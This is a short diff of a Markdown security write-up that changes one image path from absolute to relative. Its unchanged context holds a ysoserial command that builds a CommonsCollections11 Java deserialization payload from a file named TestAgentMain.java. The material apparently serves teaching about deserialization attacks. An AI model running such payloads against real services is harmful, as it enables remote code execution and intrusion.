@@ -363,4 +363,4 @@ http://wjlshare.com/archives/1582
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11 codefile:./TestAgentMain.java > cc11demo.ser
 ```
 
-![image-20231114153610044](X:\..\img\final\image-20231114153610044.png)
+![image-20231114153610044](..\img\final\image-20231114153610044.png)
